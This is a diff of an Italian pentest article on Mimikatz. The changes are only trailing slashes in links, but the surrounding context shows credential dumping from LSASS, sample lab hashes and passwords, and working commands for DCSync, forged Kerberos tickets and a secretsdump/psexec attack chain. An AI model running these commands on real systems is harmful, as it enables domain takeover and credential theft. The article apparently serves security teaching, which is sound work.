@@ -19,7 +19,7 @@ featured: true
 
 Mimikatz è lo strumento più potente per il **credential dumping su Windows** e il dominio di **Active Directory**. Utilizzato in pentest e Red Team, permette di estrarre password in chiaro, hash NTLM e ticket Kerberos direttamente dalla memoria LSASS.
 
-Con Mimikatz puoi eseguire attacchi come **[Pass-the-Hash](https://hackita.it/articoli/pass-the-hash)**, **[DCSync](https://hackita.it/articoli/dcsync)** e **[Golden Ticket](https://hackita.it/articoli/golden-ticket)**, ottenendo accesso completo al dominio senza conoscere le password reali.
+Con Mimikatz puoi eseguire attacchi come **[Pass-the-Hash](https://hackita.it/articoli/pass-the-hash/)**, **[DCSync](https://hackita.it/articoli/dcsync/)** e **[Golden Ticket](https://hackita.it/articoli/golden-ticket/)**, ottenendo accesso completo al dominio senza conoscere le password reali.
 
 In questa guida vedrai i **comandi Mimikatz più importanti**, come usarli in scenari reali e come trasformare un accesso locale in compromissione totale dell’infrastruttura.
 
@@ -176,14 +176,14 @@ kerberos :
 
 **j.smith:**
 
-* **Hash NTLM**: `64f12cddaa88057e06a81b54e73b949b` → [Pass-the-Hash](https://hackita.it/articoli/pass-the-hash) verso qualsiasi servizio
+* **Hash NTLM**: `64f12cddaa88057e06a81b54e73b949b` → [Pass-the-Hash](https://hackita.it/articoli/pass-the-hash/) verso qualsiasi servizio
 * **Password in chiaro**: `Summer2026!` (da tspkg/wdigest/kerberos) → login diretto ovunque
 * **Credential Manager**: `admin@10.10.10.50 / AdminP@ss!` → credenziali salvate per un altro server
 
 **svc\_sql:**
 
 * **Hash NTLM**: `a87f3a337d73085c45f9416be5787d86` → PtH verso SQL server
-* **Password**: `SqlS3rvice2025!` → login diretto su [MSSQL](https://hackita.it/articoli/porta-1433-mssql)
+* **Password**: `SqlS3rvice2025!` → login diretto su [MSSQL](https://hackita.it/articoli/porta-1433-mssql/)
 
 **Nota sulle password in chiaro:**
 
@@ -328,11 +328,11 @@ User      : CORP\admin
 MsCacheV2 : $DCC2$10240#admin#hash...
 ```
 
-Crackabili con [hashcat](https://hackita.it/articoli/hashcat) mode 2100 — molto più lente di NTLM.
+Crackabili con [hashcat](https://hackita.it/articoli/hashcat/) mode 2100 — molto più lente di NTLM.
 
 ### lsadump::dcsync — Il Comando più Potente
 
-Replica il database AD dal DC. Per la guida completa: [DCSync](https://hackita.it/articoli/dcsync).
+Replica il database AD dal DC. Per la guida completa: [DCSync](https://hackita.it/articoli/dcsync/).
 
 ```
 mimikatz # lsadump::dcsync /domain:corp.local /user:Administrator
@@ -426,7 +426,7 @@ TGS forgiato per un singolo servizio — invisibile al DC.
 mimikatz # kerberos::golden /user:fakeadmin /domain:corp.local /sid:S-1-5-21-... /target:sql01.corp.local /service:MSSQLSvc /rc4:a87f3a337d73085c45f9416be5787d86 /ptt
 ```
 
-Accesso a [MSSQL](https://hackita.it/articoli/porta-1433-mssql) su sql01 senza contattare il DC.
+Accesso a [MSSQL](https://hackita.it/articoli/porta-1433-mssql/) su sql01 senza contattare il DC.
 
 ### kerberos::ptt — Pass-the-Ticket
 
@@ -629,7 +629,7 @@ secretsdump.py corp/DA:pass@DC01 -just-dc
 → psexec.py -k -no-pass → shell su qualsiasi macchina
 ```
 
-Per il workflow DCSync dettagliato: [guida DCSync](https://hackita.it/articoli/dcsync).
+Per il workflow DCSync dettagliato: [guida DCSync](https://hackita.it/articoli/dcsync/).
 
 ## 10. Detection
 
